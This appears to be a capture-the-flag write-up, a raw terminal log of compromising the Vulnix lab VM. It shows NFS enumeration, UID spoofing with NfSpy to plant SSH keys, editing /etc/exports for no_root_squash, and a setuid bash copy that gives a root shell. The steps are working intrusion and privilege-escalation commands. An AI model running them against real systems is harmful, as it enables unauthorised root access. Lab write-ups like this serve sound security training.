@@ -1,0 +1,142 @@
+root@kali:~/Documents/Vulnix# finger vulnix@192.168.1.139
+Login: vulnix         			Name: 
+Directory: /home/vulnix             	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+root@kali:~/Documents/Vulnix# showmount -e 192.168.1.139
+Export list for 192.168.1.139:
+/home/vulnix *
+root@kali:~/Documents/Vulnix# mkdir /tmp/mnt
+root@kali:~/Documents/Vulnix# mount 192.168.1.139:/home/vulnix /tmp/mnt
+root@kali:~/Documents/Vulnix# cd /tmp
+root@kali:/tmp# cd mnt
+bash: cd: mnt: Permission denied
+root@kali:/tmp# mkdir .ssh
+root@kali:/tmp# cd .ssh/
+root@kali:/tmp/.ssh# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /tmp/.ssh/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/.ssh/id_rsa.
+Your public key has been saved in /tmp/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:iXwGotoa0wOByvvcThklnKGKi+KyAlSbGnUVDdkJEEI root@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|  .E ++=B .      |
+|.  o+.o. +       |
+|o o.=+..         |
+|++.+ ooo .       |
+|=o+  .o S        |
+|oB.   oo         |
+|O.+  o           |
+|=+o.o            |
+|=o o.o           |
++----[SHA256]-----+
+root@kali:/tmp/.ssh# cat id_rsa.pub > authorized_keys
+
+root@kali:~/Documents/Vulnix# git clone https://github.com/bonsaiviking/NfSpy.git
+
+root@kali:~/Documents/Vulnix/NfSpy/scripts# nfspysh -o server=192.168.1.139:/home/vulnix
+nfspy@192.168.1.139:/home/vulnix:/> ls
+/:
+040750   2008   2008        4096 2012-09-03 02:25:02 .
+100644   2008   2008         220 2012-04-03 23:58:14 .bash_logout
+100644   2008   2008         675 2012-04-03 23:58:14 .profile
+040750   2008   2008        4096 2012-09-03 02:25:02 ..
+100644   2008   2008        3486 2012-04-03 23:58:14 .bashrc
+nfspy@192.168.1.139:/home/vulnix:/> mkdir .ssh
+nfspy@192.168.1.139:/home/vulnix:/> cd .ssh
+nfspy@192.168.1.139:/home/vulnix:/.ssh> ls
+/.ssh:
+040755   2008   2008        4096 2019-05-12 16:56:08 .
+040750   2008   2008        4096 2019-05-12 16:56:08 ..
+nfspy@192.168.1.139:/home/vulnix:/.ssh> put /tmp/.ssh/authorized_keys
+nfspy@192.168.1.139:/home/vulnix:/.ssh> ls
+/.ssh:
+040755   2008   2008        4096 2019-05-12 16:56:32 .
+100644   2008   2008         391 2019-05-12 16:56:32 authorized_keys
+040750   2008   2008        4096 2019-05-12 16:56:08 ..
+nfspy@192.168.1.139:/home/vulnix:/.ssh> exit
+Quitting.
+
+root@kali:/tmp/.ssh# ssh -i id_rsa vulnix@192.168.1.139
+vulnix@vulnix:~$ sudo -l
+vulnix@vulnix:~$ sudoedit /etc/exports 
+Update to: /home/vulnix    *(rw,no_root_squash)
+
+/usr/sbin/exportfs -a or RESTART VM
+
+root@kali:/tmp/.ssh# unmout /tmp/mnt
+
+root@kali:/tmp/.ssh# mount 192.168.1.139:/home/vulnix /tmp/mnt/
+root@kali:/tmp/.ssh# cd /tmp/mnt
+root@kali:/tmp/mnt# ls -aul
+total 28
+drwxr-x---  4 vulnix vulnix 4096 May 12  2019 .
+drwxrwxrwt 24 root   root   4096 May 12 16:56 ..
+-rw-------  1 vulnix vulnix    0 May 12 17:02 .bash_history
+-rw-r--r--  1 vulnix vulnix  220 May 12 17:02 .bash_logout
+-rw-r--r--  1 vulnix vulnix 3486 May 12 16:59 .bashrc
+drwx------  2 vulnix vulnix 4096 May 12 16:59 .cache
+-rw-r--r--  1 vulnix vulnix  675 May 12 16:59 .profile
+drwxr-xr-x  2 vulnix vulnix 4096 May 12 16:57 .ssh
+
+Copy bash:
+root@kali:/tmp/mnt# cp /bin/bash .
+root@kali:/tmp/mnt# ls
+bash
+
+*Setuid + Setgid on Directories
+Setting the setgid bit on a directory means any files created in that directory will be owned by the group who owns the directory. No matter what your primary group is, any files you make will be owned by the group who owns the directory.
+
+root@kali:/tmp/mnt# chmod 4777 bash
+
+root@kali:/tmp/mnt# ssh -i /tmp/.ssh/id_rsa vulnix@192.168.1.139
+
+vulnix@vulnix:~$ ./bash 
+./bash: error while loading shared libraries: libtinfo.so.6: cannot open shared object file: No such file or directory
+vulnix@vulnix:~$ cp /bin/bash .
+vulnix@vulnix:~$ ls
+bash
+vulnix@vulnix:~$ ls -aul
+total 928
+drwxr-x--- 4 vulnix vulnix   4096 May 12 10:07 .
+drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..
+-rwxrwxrwx 1 root   root   920788 May 12 10:10 bash
+-rw------- 1 vulnix vulnix      0 May 12 10:02 .bash_history
+-rw-r--r-- 1 vulnix vulnix    220 May 12 10:02 .bash_logout
+-rw-r--r-- 1 vulnix vulnix   3486 May 12 09:59 .bashrc
+drwx------ 2 vulnix vulnix   4096 May 12 09:59 .cache
+-rw-r--r-- 1 vulnix vulnix    675 May 12 09:59 .profile
+drwxr-xr-x 2 vulnix vulnix   4096 May 12 09:57 .ssh
+
+CHANGE bash:
+
+vulnix@vulnix:~$ exit
+logout
+Connection to 192.168.1.139 closed.
+root@kali:/tmp/mnt# chmod 4777 bash
+root@kali:/tmp/mnt# ls -aul
+total 932
+drwxr-x---  4 vulnix vulnix   4096 May 12 17:07 .
+drwxrwxrwt 24 root   root     4096 May 12 16:56 ..
+-rwsrwxrwx  1 root   root   920788 May 12 17:10 bash
+-rw-------  1 vulnix vulnix     42 May 12 17:12 .bash_history
+-rw-r--r--  1 vulnix vulnix    220 May 12 17:02 .bash_logout
+-rw-r--r--  1 vulnix vulnix   3486 May 12 16:59 .bashrc
+drwx------  2 vulnix vulnix   4096 May 12 16:59 .cache
+-rw-r--r--  1 vulnix vulnix    675 May 12 16:59 .profile
+drwxr-xr-x  2 vulnix vulnix   4096 May 12 16:57 .ssh
+
+On the victim's machine I then execute the shell keeping the original file's permissions with the flag `-p`:
+
+vulnix@vulnix:~$ ./bash -p
+bash-4.2# id
+uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
+bash-4.2# cat/root/trophy.txt
+bash: cat/root/trophy.txt: No such file or directory
+bash-4.2# cat /root/trophy.txt
+cc614640424f5bd60ce5d5264899c3be
